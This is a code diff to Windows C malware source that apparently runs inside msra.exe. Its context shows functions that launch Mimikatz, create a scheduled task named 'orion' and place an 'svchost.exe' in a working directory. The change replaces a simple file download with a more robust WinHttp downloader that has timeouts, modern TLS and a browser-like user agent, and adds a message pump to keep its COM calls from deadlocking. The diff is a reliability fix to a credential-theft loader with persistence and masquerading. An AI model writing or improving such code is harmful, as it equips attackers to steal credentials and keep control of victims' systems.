@@ -1,13 +1,13 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#include <urlmon.h>
+#include <winhttp.h>
 #include <shobjidl.h>
 #include <objbase.h>
 #include <objidl.h>
 #include <taskschd.h>
 
-#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "uuid.lib")
@@ -86,9 +86,81 @@ static void download_if_missing(const char *url, const char *outPath) {
     HANDLE h = FindFirstFileA(outPath, &fd);
     if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] Already present: %s", outPath); return; }
     audit("[+] Downloading %s -> %s", url, outPath);
-    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
-    if (hr == S_OK) audit("[+] Download complete: %s", outPath);
-    else audit("[-] Download failed (0x%lx) %s", hr, outPath);
+
+    // ponytail: URLDownloadToFileA has no timeout and can hang forever inside
+    // msra.exe's STA thread without a message pump. Use WinHttp with explicit
+    // connect/send/receive timeouts and write the body to disk ourselves.
+    // (this mingw's winhttp.h is Unicode-only, so convert url/host/path to W.)
+    WCHAR wurl[2048] = {0}, whost[256] = {0}, wpath[1024] = {0};
+    if (!MultiByteToWideChar(CP_ACP, 0, url, -1, wurl, 2048)) {
+        audit("[-] URL conversion failed (%lu) %s", GetLastError(), outPath);
+        return;
+    }
+    URL_COMPONENTS uc = { .dwStructSize = sizeof(uc) };
+    uc.lpszHostName = whost; uc.dwHostNameLength = 255;
+    uc.lpszUrlPath = wpath; uc.dwUrlPathLength = 1023;
+    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) {
+        audit("[-] WinHttpCrackUrl failed (%lu) %s", GetLastError(), outPath);
+        return;
+    }
+
+    HINTERNET hi = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hi) { audit("[-] WinHttpOpen failed (%lu)", GetLastError()); return; }
+    WinHttpSetTimeouts(hi, 10000, 30000, 30000, 30000);
+
+    HINTERNET hc = WinHttpConnect(hi, uc.lpszHostName, uc.nPort, 0);
+    if (!hc) { audit("[-] WinHttpConnect failed (%lu)", GetLastError()); WinHttpCloseHandle(hi); return; }
+
+    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hrq = WinHttpOpenRequest(hc, L"GET", uc.lpszUrlPath, NULL,
+                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hrq) { audit("[-] WinHttpOpenRequest failed (%lu)", GetLastError()); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return; }
+
+    // ponytail: allow TLS 1.2/1.3; default WinHttp on old builds caps at TLS1.0
+    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+    #ifdef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
+    proto |= WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+    #endif
+    WinHttpSetOption(hrq, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
+
+    if (!WinHttpSendRequest(hrq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
+        audit("[-] WinHttpSendRequest failed (%lu) %s", GetLastError(), outPath);
+        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
+    }
+    if (!WinHttpReceiveResponse(hrq, NULL)) {
+        audit("[-] WinHttpReceiveResponse failed (%lu) %s", GetLastError(), outPath);
+        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
+    }
+
+    DWORD status = 0, sl = sizeof(status);
+    WinHttpQueryHeaders(hrq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &sl, NULL);
+    if (status != 200) {
+        audit("[-] HTTP status %lu (expected 200) %s", status, outPath);
+        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
+    }
+
+    HANDLE hf = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) {
+        audit("[-] CreateFile for output failed (%lu) %s", GetLastError(), outPath);
+        WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi); return;
+    }
+
+    DWORD bytesRead, total = 0;
+    BYTE buf[8192];
+    while (WinHttpReadData(hrq, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
+        DWORD written;
+        if (!WriteFile(hf, buf, bytesRead, &written, NULL) || written != bytesRead) {
+            audit("[-] WriteFile failed (%lu) %s", GetLastError(), outPath);
+            break;
+        }
+        total += written;
+    }
+    CloseHandle(hf);
+    WinHttpCloseHandle(hrq); WinHttpCloseHandle(hc); WinHttpCloseHandle(hi);
+
+    if (total > 0) audit("[+] Download complete: %s (%lu bytes)", outPath, total);
+    else { audit("[-] Download produced 0 bytes %s", outPath); DeleteFileA(outPath); }
 }
 
 static void launch_mimikatz(void) {
@@ -253,6 +325,10 @@ static void create_task_orion(void) {
 static DWORD WINAPI worker_thread(LPVOID lp) {
     audit("[+] Worker thread started");
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    // ponytail: pump messages so COM (Task Scheduler API, etc.) doesn't deadlock
+    // inside this STA thread; the download itself no longer depends on it.
+    MSG msg;
+    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
 
     char svchost[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
